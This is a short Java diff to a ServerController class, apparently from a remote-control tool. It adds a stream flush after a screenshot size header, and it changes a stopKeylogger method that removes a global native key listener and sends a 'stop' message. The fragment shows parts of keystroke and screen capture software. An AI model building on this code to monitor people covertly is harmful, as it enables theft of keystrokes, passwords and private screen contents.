@@ -207,6 +207,7 @@ public class ServerController {
         ImageIO.write(bimg, "jpg", byteArrayOutputStream);
         byte[] size = ByteBuffer.allocate(4).putInt(byteArrayOutputStream.size()).array();
         outputStream.write(size);
+        outputStream.flush();
         outputStream.write(byteArrayOutputStream.toByteArray());
         outputStream.flush();
     }
@@ -228,8 +229,10 @@ public class ServerController {
             GlobalScreen.registerNativeHook();
         GlobalScreen.addNativeKeyListener(nativeKeyListener);
     }
-    public void stopKeylogger() throws NativeHookException
-    {
+    public void stopKeylogger() throws NativeHookException, IOException {
         GlobalScreen.removeNativeKeyListener(nativeKeyListener);
+        bw.write("stop");
+        bw.newLine();
+        bw.flush();
     }
 }
